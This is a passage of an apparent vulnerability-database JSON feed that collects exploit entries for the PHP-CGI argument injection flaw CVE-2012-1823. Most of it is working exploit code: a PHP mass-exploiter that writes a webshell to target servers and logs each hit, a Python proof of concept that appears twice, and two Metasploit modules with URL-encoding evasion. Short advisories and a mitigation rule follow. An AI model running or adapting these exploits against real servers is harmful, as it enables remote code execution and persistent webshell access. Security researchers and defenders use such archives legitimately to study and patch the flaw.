Exploitability */  \n$packet = \"GET \".$p.\"?-s HTTP/1.1\\r\\n\";  \n$packet .= \"Host: \".$host.\"\\r\\n\";  \n$packet .= \"User-Agent: PHP CGI Argument Injection Exploiter \\r\\n\\r\\n\";  \nsendpacket($packet,1,0,0);  \n$str = array(  \n'<code><span','<?');  \nforeach ($str as $value => $search){  \nif(stristr($html, $search) == TRUE)  \n{$i=$i+1;}}  \nswitch($i)  \n{  \ncase 0:  \necho '<font color=red>'.$host.' Faild!<br></font>';  \nbreak;  \ncase 2:  \necho '<font color=#FFF8C6>'.$host.' Exploitable<br></font>';  \nExploit($host,$path,$p);  \n}  \n}  \n  \nFunction Exploit($host,$path,$p)  \n{  \nglobal $html, $shell;  \n/* Exploiting */  \n  \n$payload = \"<?php \\$myFile = \\\"legalpentest.php\\\"; \\$filehandle =   \nfopen(\\$myFile, 'w') or die(\\\"can't open file\\\"); \\$Data=$shell;   \nfwrite(\\$filehandle, \\$Data);fclose(\\$filehandle);\";  \n$packet = \"POST   \n\".$p.\"/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input   \nHTTP/1.1\\r\\n\";  \n$packet .= \"Host: \".$host.\"\\r\\n\";  \n$packet .= \"User-Agent: PHP CGI Argument Injection Exploiter\\r\\n\";  \n$packet .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";  \n$packet .= \"Content-Length: \".strlen($payload).\"\\r\\n\\r\\n\";  \n$packet .= $payload.\"\\r\\n\\r\\n\\r\\n\\r\\n\";  \nsendpacket($packet,1,0,0);  \n/* Check for successfully   \nuploaded */  \n$packet = \"HEAD \".$p.\"/legalpentest.php HTTP/1.1\\r\\n\";  \n$packet .= \"Host: \".$host.\"\\r\\n\";  \n$packet .= \"User-Agent: :) \\r\\n\\r\\n\";  \nsendpacket($packet,1,0,0);  \n  \nif(stristr($html , '404 Not Found') == true)  \n{  \necho '<font color=#FFF8C6><br>Exploit   \nFaild...<br>-------------------------------------------------------<br></font>';  \n}  \nelse {  \necho \"<font color=#FFF8C6><br>Exploit   \nSucceeded...<br>http://$host$path\".\"/legalpentest.php<br>-------------------------------------------------------<br></font>\";  \nfile_put_contents(realpath(dirname(__FILE__)).'/shell.txt',   \n\"http://$host$path\".\"/legalpentest.php\\r\\n\", FILE_APPEND);  \n}  \n}  \n  \n  \nfunction sendpacket($packet,$response = 0,$output = 0,$s=0)  \n{  \n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';  \nglobal $proxy, $host, $port, $html, $user, $pass;  \nif ($proxy == '')  \n{  \n$ock = fsockopen($host,$port);  \nstream_set_timeout($ock, 5);  \nif (!$ock)  \n{  \necho 'No response from '.htmlentities($host).' ...<br>';  \nstream_set_timeout($ock, 4);  \n}  \n} else  \n{  \n$parts = explode(':',$proxy);  \n// echo '<font color=white>Connecting to proxy:   \n'.$parts[0].':'.$parts[1].' ...<br><br/></font>';  \n$ock = fsockopen($parts[0],$parts[1]);  \nstream_set_timeout($ock, 5);  \nif (!$ock)  \n{  \necho 'No response from proxy...<br>';  \nfclose($ock);  \n}  \n}  \n  \nif ($ock)  \n{  \nfputs($ock,$packet);  \nif ($response == 1)  \n{  \nif ($proxy == '')  \n{  \n$html = '';  \nwhile (!feof($ock))  \n{  \n$html .= fgets($ock);  \n}  \n} else  \n{  \n$html = '';  \nwhile ((!feof($ock)) or   \n(!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))  \n{  \n$html .= fread($ock,1);  \n}  \n}  \n} else $html = '';  \n  \nfclose($ock);  \n}  \n}  \n?>  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:112971"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Added: 05/15/2012  \nCVE: [CVE-2012-1823](<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823>)  \nBID: [53388](<http://www.securityfocus.com/bid/53388>)  \nOSVDB: [81633](<http://www.osvdb.org/81633>)  \n\n\n### Background\n\nPHP is a widely used general-purpose scripting language that is especially suited for Web development. \n\n### Problem\n\nWhen configured as a CGI script (aka php-cgi), PHP does not properly handle query string parameters which are passed directly to the php-cgi program. This can be exploited to execute arbitrary system commands or disclose the PHP source code. \n\n### Resolution\n\nUpgrade PHP to version 5.4.3 or 5.3.13 or higher. \n\n### References\n\n<http://secunia.com/advisories/49014>  \n<http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823>  \n\n\n### Limitations\n\nThis exploit has been tested against PHP 5.3.10 on Windows XP SP3 and PHP 5.4.0 on Ubuntu 11.10 Linux. \n\n### Platforms\n\nWindows  \nLinux  \nMac OS X  \n  \n\n",
            "modified": "2012-05-15T00:00:00",
            "published": "2012-05-15T00:00:00",
            "id": "SAINT:A44F3BA5218E70289A3DA48E0A2F5B88",
            "href": "http://www.saintcorporation.com/cgi-bin/exploit_info/php_cgi_arg_rce",
            "type": "saint",
            "title": "PHP CGI Query String Parameters Command Execution",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/saint/SAINT:A44F3BA5218E70289A3DA48E0A2F5B88"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Added: 05/15/2012  \nCVE: [CVE-2012-1823](<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823>)  \nBID: [53388](<http://www.securityfocus.com/bid/53388>)  \nOSVDB: [81633](<http://www.osvdb.org/81633>)  \n\n\n### Background\n\nPHP is a widely used general-purpose scripting language that is especially suited for Web development. \n\n### Problem\n\nWhen configured as a CGI script (aka php-cgi), PHP does not properly handle query string parameters which are passed directly to the php-cgi program. This can be exploited to execute arbitrary system commands or disclose the PHP source code. \n\n### Resolution\n\nUpgrade PHP to version 5.4.3 or 5.3.13 or higher. \n\n### References\n\n<http://secunia.com/advisories/49014>  \n<http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823>  \n\n\n### Limitations\n\nThis exploit has been tested against PHP 5.3.10 on Windows XP SP3 and PHP 5.4.0 on Ubuntu 11.10 Linux. \n\n### Platforms\n\nWindows  \nLinux  \nMac OS X  \n  \n\n",
            "modified": "2012-05-15T00:00:00",
            "published": "2012-05-15T00:00:00",
            "href": "http://download.saintcorporation.com/cgi-bin/exploit_info/php_cgi_arg_rce",
            "id": "SAINT:4757B9E50DEDA6FBFE3C977620C279FB",
            "type": "saint",
            "title": "PHP CGI Query String Parameters Command Execution",
            "cvss": {
                "score": 7.5,
                "vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P"
            },
            "vhref": "https://vulners.com/saint/SAINT:4757B9E50DEDA6FBFE3C977620C279FB"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Added: 05/15/2012  \nCVE: [CVE-2012-1823](<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823>)  \nBID: [53388](<http://www.securityfocus.com/bid/53388>)  \nOSVDB: [81633](<http://www.osvdb.org/81633>)  \n\n\n### Background\n\nPHP is a widely used general-purpose scripting language that is especially suited for Web development. \n\n### Problem\n\nWhen configured as a CGI script (aka php-cgi), PHP does not properly handle query string parameters which are passed directly to the php-cgi program. This can be exploited to execute arbitrary system commands or disclose the PHP source code. \n\n### Resolution\n\nUpgrade PHP to version 5.4.3 or 5.3.13 or higher. \n\n### References\n\n<http://secunia.com/advisories/49014>  \n<http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823>  \n\n\n### Limitations\n\nThis exploit has been tested against PHP 5.3.10 on Windows XP SP3 and PHP 5.4.0 on Ubuntu 11.10 Linux. \n\n### Platforms\n\nWindows  \nLinux  \nMac OS X  \n  \n\n",
            "modified": "2012-05-15T00:00:00",
            "published": "2012-05-15T00:00:00",
            "id": "SAINT:383F4FB67DCF7CAE7E06F44A5B5DC13F",
            "href": "https://my.saintcorporation.com/cgi-bin/exploit_info/php_cgi_arg_rce",
            "title": "PHP CGI Query String Parameters Command Execution",
            "type": "saint",
            "cvss": {
                "score": 7.5,
                "vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P"
            },
            "vhref": "https://vulners.com/saint/SAINT:383F4FB67DCF7CAE7E06F44A5B5DC13F"
        },
        {
            "bulletinFamily": "exploit",
            "description": "**Name**|  php_cgi_remote  \n---|---  \n**CVE**|  CVE-2012-1823  \n**Exploit Pack**|  [CANVAS](<http://http://www.immunityinc.com/products-canvas.shtml>)  \n**Description**| php_cgi_remote  \n**Notes**| CVE Name: CVE-2012-1823  \nVENDOR: www.php.net  \nNotes:   \nAlso see:  \nhttp://www.kb.cert.org/vuls/id/520827  \n  \n  \n  \nRepeatability: Infinite  \nCVE URL: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-1823  \nCVSS: 7.5  \n\n",
            "modified": "2012-05-11T10:15:00",
            "published": "2012-05-11T10:15:00",
            "href": "http://exploitlist.immunityinc.com/home/exploitpack/CANVAS/php_cgi_remote",
            "id": "PHP_CGI_REMOTE",
            "title": "Immunity Canvas: PHP_CGI_REMOTE",
            "type": "canvas",
            "cvss": {
                "score": 7.5,
                "vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P"
            },
            "vhref": "https://vulners.com/canvas/PHP_CGI_REMOTE"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-05-06T00:00:00",
            "published": "2012-05-06T00:00:00",
            "href": "https://packetstormsecurity.com/files/112486/PHP-CGI-Injection.html",
            "id": "PACKETSTORM:112486",
            "type": "packetstorm",
            "title": "PHP CGI Injection ",
            "sourceData": "`######################################################################################  \n# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit  \n# Date: May 4, 2012  \n# Author: rayh4c[0x40]80sec[0x2e]com  \n# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com  \n######################################################################################  \n  \nimport socket  \nimport sys  \n  \ndef cgi_exploit():  \npwn_code = \"\"\"<?php phpinfo();?>\"\"\"  \npost_Length = len(pwn_code)  \nhttp_raw=\"\"\"POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1  \nHost: %s  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: %s  \n  \n%s  \n\"\"\" %(HOST , post_Length ,pwn_code)  \nprint http_raw  \ntry:  \nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \nsock.connect((HOST, int(PORT)))  \nsock.send(http_raw)  \ndata = sock.recv(10000)  \nprint repr(data)  \nsock.close()  \nexcept socket.error, msg:  \nsys.stderr.write(\"[ERROR] %s\\n\" % msg[1])  \nsys.exit(1)  \n  \nif __name__ == '__main__':  \ntry:  \nHOST = sys.argv[1]  \nPORT = sys.argv[2]  \ncgi_exploit()  \nexcept IndexError:  \nprint '[+]Usage: cgi_test.py site.com 80'  \nsys.exit(-1)  \n  \n  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:112486"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2012-05-06T00:00:00",
            "published": "2012-05-06T00:00:00",
            "href": "https://packetstormsecurity.com/files/112477/PHP-CGI-Argument-Injection.html",
            "id": "PACKETSTORM:112477",
            "type": "packetstorm",
            "title": "PHP CGI Argument Injection",
            "sourceData": "`##  \n# $Id$  \n##  \n  \n##  \n# This file is part of the Metasploit Framework and may be subject to  \n# redistribution and commercial restrictions. Please see the Metasploit  \n# web site for more information on licensing and terms of use.  \n# http://metasploit.com/  \n##  \n  \nrequire 'msf/core'  \n  \nclass Metasploit3 < Msf::Exploit::Remote  \nRank = ExcellentRanking  \n  \ninclude Msf::Exploit::Remote::HttpClient  \n  \ndef initialize(info = {})  \nsuper(update_info(info,  \n'Name' => 'PHP CGI Argument Injection',  \n'Description' => %q{  \nWhen run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to  \nan argument injection vulnerability. This module takes advantage of  \nthe -d flag to set php.ini directives to achieve code execution.  \nFrom the advisory: \"if there is NO unescaped '=' in the query string,  \nthe string is split on '+' (encoded space) characters, urldecoded,  \npassed to a function that escapes shell metacharacters (the \"encoded in  \na system-defined manner\" from the RFC) and then passes them to the CGI  \nbinary.\"  \n},  \n'Author' => [ 'egypt', 'hdm' ],  \n'License' => MSF_LICENSE,  \n'Version' => '$Revision$',  \n'References' => [  \n[ 'CVE' , '2012-1823' ],  \n[ 'OSVDB', '81633'],  \n[ 'URL' , 'http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/' ],  \n],  \n'Privileged' => false,  \n'Payload' =>  \n{  \n'DisableNops' => true,  \n# Arbitrary big number. The payload gets sent as an HTTP  \n# response body, so really it's unlimited  \n'Space' => 262144, # 256k  \n},  \n'DisclosureDate' => 'May 03 2012',  \n'Platform' => 'php',  \n'Arch' => ARCH_PHP,  \n'Targets' => [[ 'Automatic', { }]],  \n'DefaultTarget' => 0))  \n  \nregister_options([  \nOptString.new('TARGETURI', [false, \"The URI to request (must be a CGI-handled PHP script)\"]),  \n], self.class)  \nend  \n  \n# php-cgi -h  \n# ...  \n# -s Display colour syntax highlighted source.  \ndef check  \nuri = target_uri.path  \n  \nuri.gsub!(/\\?.*/, \"\")  \n  \nprint_status(\"Checking uri #{uri}\")  \n  \nresponse = send_request_raw({ 'uri' => uri })  \n  \nif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi  \nprint_error(\"Server responded in a way that was ambiguous, could not determine whether it was vulnerable\")  \nreturn Exploit::CheckCode::Unknown  \nend  \n  \nresponse = send_request_raw({ 'uri' => uri + '?-s'})  \nif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi  \nreturn Exploit::CheckCode::Vulnerable  \nend  \n  \nprint_error(\"Server responded indicating it was not vulnerable\")  \nreturn Exploit::CheckCode::Safe  \nend  \n  \ndef exploit  \nbegin  \nargs = [  \n\"-d+allow_url_include%3d#{rand_php_ini_true}\",  \n\"-d+safe_mode%3d#{rand_php_ini_false}\",  \n\"-d+suhosin.simulation%3d#{rand_php_ini_true}\",  \n\"-d+disable_functions%3d%22%22\",  \n\"-d+open_basedir%3dnone\",  \n\"-d+auto_prepend_file%3dphp://input\",  \n\"-n\"  \n]  \n  \nqs = args.join(\"+\")  \nuri = \"#{target_uri}?#{qs}\"  \n  \n# Has to be all on one line, so gsub out the comments and the newlines  \npayload_oneline = \"<?php \" + payload.encoded.gsub(/\\s*#.*$/, \"\").gsub(\"\\n\", \"\")  \nresponse = send_request_cgi( {  \n'method' => \"POST\",  \n'global' => true,  \n'uri' => uri,  \n'data' => payload_oneline,  \n}, 0.5)  \nhandler  \n  \nrescue ::Interrupt  \nraise $!  \nrescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused  \nprint_error(\"The target service unreachable\")  \nrescue ::OpenSSL::SSL::SSLError  \nprint_error(\"The target failed to negotiate SSL, is this really an SSL service?\")  \nend  \n  \nend  \n  \ndef rand_php_ini_false  \nRex::Text.to_rand_case([ \"0\", \"off\", \"false\" ][rand(3)])  \nend  \n  \ndef rand_php_ini_true  \nRex::Text.to_rand_case([ \"1\", \"on\", \"true\" ][rand(3)])  \nend  \n  \nend  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:112477"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP CGI Argument Injection Exploit. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2012-05-05T00:00:00",
            "published": "2012-05-05T00:00:00",
            "id": "EDB-ID:18836",
            "href": "https://www.exploit-db.com/exploits/18836/",
            "type": "exploitdb",
            "title": "PHP CGI Argument Injection Exploit",
            "sourceData": "######################################################################################\r\n# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit\r\n# Date: May 4, 2012\r\n# Author: rayh4c[0x40]80sec[0x2e]com\r\n# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com\r\n######################################################################################\r\n\r\nimport socket\r\nimport sys\r\n\r\ndef cgi_exploit():\r\n        pwn_code = \"\"\"<?php phpinfo();?>\"\"\" \r\n        post_Length = len(pwn_code)\r\n        http_raw=\"\"\"POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\n%s\r\n\"\"\" %(HOST , post_Length ,pwn_code)\r\n        print http_raw\r\n        try:\r\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            sock.connect((HOST, int(PORT)))\r\n            sock.send(http_raw)\r\n            data = sock.recv(10000)\r\n            print repr(data)\r\n            sock.close()\r\n        except socket.error, msg:\r\n            sys.stderr.write(\"[ERROR] %s\\n\" % msg[1])\r\n            sys.exit(1)\r\n               \r\nif __name__ == '__main__':\r\n        try:\r\n            HOST = sys.argv[1]\r\n            PORT = sys.argv[2]\r\n            cgi_exploit()\r\n        except IndexError:\r\n            print '[+]Usage: cgi_test.py site.com 80'\r\n            sys.exit(-1)",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18836"
        },
        {
            "bulletinFamily": "exploit",
            "description": "When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability. This module takes advantage of the -d flag to set php.ini directives to achieve code execution. From the advisory: \"if there is NO unescaped '=' in the query string, the string is split on '+' (encoded space) characters, urldecoded, passed to a function that escapes shell metacharacters (the \"encoded in a system-defined manner\" from the RFC) and then passes them to the CGI binary.\" This module can also be used to exploit the plesk 0day disclosed by kingcope and exploited in the wild on June 2013.\n",
            "modified": "2017-07-24T13:26:21",
            "published": "2012-05-04T17:17:41",
            "id": "MSF:EXPLOIT/MULTI/HTTP/PHP_CGI_ARG_INJECTION",
            "href": "",
            "type": "metasploit",
            "title": "PHP CGI Argument Injection",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PHP CGI Argument Injection',\n      'Description'    => %q{\n        When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\n        an argument injection vulnerability.  This module takes advantage of\n        the -d flag to set php.ini directives to achieve code execution.\n        From the advisory: \"if there is NO unescaped '=' in the query string,\n        the string is split on '+' (encoded space) characters, urldecoded,\n        passed to a function that escapes shell metacharacters (the \"encoded in\n        a system-defined manner\" from the RFC) and then passes them to the CGI\n        binary.\" This module can also be used to exploit the plesk 0day disclosed\n        by kingcope and exploited in the wild on June 2013.\n      },\n      'Author'         =>\n        [\n          'egypt', 'hdm',  #original msf exploit\n          'jjarmoc',       #added URI encoding obfuscation\n          'kingcope',      #plesk poc\n          'juan vazquez'   #add support for plesk exploitation\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n          [ 'CVE', '2012-1823' ],\n          [ 'OSVDB', '81633'],\n          [ 'OSVDB', '93979'],\n          [ 'EDB', '25986'],\n          [ 'URL', 'http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/' ],\n          [ 'URL', 'http://kb.parallels.com/en/116241']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as an HTTP\n          # response body, so really it's unlimited\n          'Space'       => 262144, # 256k\n        },\n      'DisclosureDate' => 'May 03 2012',\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DefaultTarget' => 0))\n\n    register_options([\n      OptString.new('TARGETURI', [false, \"The URI to request (must be a CGI-handled PHP script)\"]),\n      OptInt.new('URIENCODING', [true, \"Level of URI URIENCODING and padding (0 for minimum)\",0]),\n      OptBool.new('PLESK', [true, \"Exploit Plesk\", false]),\n    ])\n  end\n\n  # php-cgi -h\n  # ...\n  #   -s               Display colour syntax highlighted source.\n  def check\n\n    vprint_status(\"Checking uri #{uri}\")\n\n    response = send_request_raw({ 'uri' => uri })\n\n    if response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi and not datastore['PLESK']\n      vprint_error(\"Server responded in a way that was ambiguous, could not determine whether it was vulnerable\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    response = send_request_raw({ 'uri' => uri + \"?#{create_arg(\"-s\")}\"})\n    if response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    if datastore['PLESK'] and response and response.code == 500\n      return Exploit::CheckCode::Appears\n    end\n\n    vprint_error(\"Server responded indicating it was not vulnerable\")\n    return Exploit::CheckCode::Safe\n  end\n\n  def uri\n    if datastore['PLESK']\n      normalize_uri(\"phppath\", \"php\")\n    else\n      normalize_uri(target_uri.path).gsub(/\\?.*/, \"\")\n    end\n  end\n\n  def uri_encoding_level\n    if datastore['PLESK']\n      return 0\n    else\n      return datastore['URIENCODING']\n    end\n  end\n\n  def exploit\n    begin\n      args = [\n        rand_spaces(),\n        create_arg(\"-d\",\"allow_url_include=#{rand_php_ini_true}\"),\n        create_arg(\"-d\",\"safe_mode=#{rand_php_ini_false}\"),\n        create_arg(\"-d\",\"suhosin.simulation=#{rand_php_ini_true}\"),\n        create_arg(\"-d\",'disable_functions=\"\"'),\n        create_arg(\"-d\",\"open_basedir=none\"),\n        create_arg(\"-d\",\"auto_prepend_file=php://input\"),\n        create_arg(\"-d\", \"cgi.force_redirect=#{rand_php_ini_false}\"),\n        create_arg(\"-d\", \"cgi.redirect_status_env=0\"),\n        rand_opt_equiv(\"-n\")\n      ]\n\n      qs = args.join()\n\n      # Has to be all on one line, so gsub out the comments and the newlines\n      payload_oneline = \"<?php \" + payload.encoded.gsub(/\\s*#.*$/, \"\").gsub(\"\\n\", \"\")\n      response = send_request_cgi( {\n        'method' => \"POST\",\n        'global' => true,\n        'uri'    => \"#{uri}?#{qs}\",\n        'data'   => payload_oneline,\n      }, 0.5)\n      handler\n\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\n      print_error(\"The target service unreachable\")\n    rescue ::OpenSSL::SSL::SSLError\n      print_error(\"The target failed to negotiate SSL, is this really an SSL service?\")\n    end\n\n  end\n\n  def create_arg(arg, val = nil)\n    if val\n      val = rand_encode(val)\n      val.gsub!('=','%3d')   # = must always be encoded\n      val.gsub!('\"','%22')   # \" too\n    end\n\n    ret = ''\n    ret << \"#{rand_spaces}\"\n    ret << \"#{rand_opt_equiv(arg)}\"\n    ret << \"#{rand_space}\"\n    ret << \"#{rand_spaces}\"\n    ret << \"#{val}\"\n    ret << \"#{rand_space}\"\n  end\n\n  def rand_opt_equiv(opt)\n    # Returns a random equivilant option from mapping at\n    # http://www.php.net/manual/en/features.commandline.options.php\n    opt_equivs = {\n      \"-d\" => [\n        \"#{rand_dash}#{rand_encode(\"d\")}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode(\"define\")}\"\n        ],\n      \"-s\" => [\n        \"#{rand_dash}#{rand_encode(\"s\")}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode(\"syntax-highlight\")}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode(\"syntax-highlighting\")}\"\n        ],\n      \"-T\" => [\n        \"#{rand_dash}#{rand_encode(\"T\")}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode(\"timing\")}\"\n        ],\n      \"-n\" => [\n        \"#{rand_dash}#{rand_encode(\"n\")}\",\n        \"#{rand_dash}#{rand_dash}#{rand_encode(\"no-php-ini\")}\"\n        ]\n      }\n\n    equivs = opt_equivs[opt]\n    equivs ? equivs[rand(opt_equivs[opt].length)] : opt\n\n  end\n\n  def rand_encode(string, max = string.length)\n    # Randomly URI encode characters from string, up to max times.\n    chars = [];\n    if max > uri_encoding_level then max = uri_encoding_level end\n    if string.length == 1\n      if rand(2) > 0\n        chars << 0\n      end\n    else\n      if max > 0\n        max.times { chars << rand(string.length)}\n      end\n    end\n    chars.uniq.sort.reverse.each{|index|  string[index] = Rex::Text.uri_encode(string[index,1], \"hex-noslashes\")}\n    string\n  end\n\n  def rand_spaces(num = uri_encoding_level)\n    ret = ''\n    num.times {\n      ret << rand_space\n    }\n    ret\n  end\n\n  def rand_space\n    uri_encoding_level > 0 ? [\"%20\",\"%09\",\"+\"][rand(3)] : \"+\"\n  end\n\n  def rand_dash\n    uri_encoding_level > 0 ? [\"-\",\"%2d\",\"%2D\"][rand(3)] : \"-\"\n  end\n\n  def rand_php_ini_false\n    Rex::Text.to_rand_case([ \"0\", \"off\", \"false\" ][rand(3)])\n  end\n\n  def rand_php_ini_true\n    Rex::Text.to_rand_case([ \"1\", \"on\", \"true\" ][rand(3)])\n  end\nend\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P"
            },
            "vhref": "https://vulners.com/metasploit/MSF:EXPLOIT/MULTI/HTTP/PHP_CGI_ARG_INJECTION"
        },
        {
            "bulletinFamily": "exploit",
            "description": "CVE ID: CVE-2012-1823\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\uff0cPHP\u4e0e\u5fae\u8f6f\u7684ASP\u9887\u6709\u51e0\u5206\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u79cd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u7684\u5d4c\u5165HTML\u6587\u6863\u7684\u811a\u672c\u8bed\u8a00\uff0c\u8bed\u8a00\u7684\u98ce\u683c\u6709\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\uff0c\u73b0\u5728\u88ab\u5f88\u591a\u7684\u7f51\u7ad9\u7f16\u7a0b\u4eba\u5458\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\u53ef\u4ee5\u88ab\u5404\u79cdWeb\u670d\u52a1\u5668\u4ee5\u591a\u79cd\u65b9\u5f0f\u8c03\u7528\uff0c\u5b9e\u73b0\u52a8\u6001\u7f51\u9875\u7684\u529f\u80fd\u3002\r\n\r\nPHP\u5904\u7406\u53c2\u6570\u7684\u4f20\u9012\u65f6\u5b58\u5728\u6f0f\u6d1e\uff0c\u5728\u7279\u5b9a\u7684\u914d\u7f6e\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u6b64\u6f0f\u6d1e\u5728\u670d\u52a1\u5668\u4e0a\u83b7\u53d6\u811a\u672c\u6e90\u7801\u6216\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\r\n\r\n\u5f53PHP\u4ee5\u7279\u5b9a\u7684CGI\u65b9\u5f0f\u88ab\u8c03\u7528\u65f6\uff08\u4f8b\u5982Apache\u7684mod_cgid\uff09\uff0cphp-cgi\u63a5\u6536\u5904\u7406\u8fc7\u7684\u67e5\u8be2\u683c\u5f0f\u5b57\u7b26\u4e32\u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5141\u8bb8\u547d\u4ee4\u884c\u5f00\u5173\uff08\u4f8b\u5982-s\u3001-d \u6216-c\uff09\u4f20\u9012\u5230php-cgi\u7a0b\u5e8f\uff0c\u5bfc\u81f4\u6e90\u4ee3\u7801\u6cc4\u9732\u548c\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002FastCGI\u4e0d\u53d7\u5f71\u54cd\u3002\n0\nPHP\n\u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n\u4f7f\u7528RewriteRule\u6765\u8fc7\u6ee4\u8bf7\u6c42\uff1a\r\n\r\nRewriteRule\u89c4\u5219\u5982\u4e0b\r\n\r\nRewriteEngine on\r\nRewriteCond %{QUERY_STRING} ^[^=]*$\r\nRewriteCond %{QUERY_STRING} %2d|\\- [NC]\r\nRewriteRule .? - [F,L]\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e865.3.12\u53ca5.4.2\u4e24\u4e2a\u6700\u65b0\u7248\u672c\uff0c\u4f46\u6709\u62a5\u544a\u8bf4\u5e76\u6ca1\u6709\u6b63\u786e\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5bc6\u5207\u5173\u6ce8\u5382\u5546\u7f51\u7ad9\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-05-04T00:00:00",
            "published": "2012-05-04T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60093",
            "id": "SSV:60093",
            "type": "seebug",
            "title": "PHP-CGI\u8fdc\u7a0b\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e",
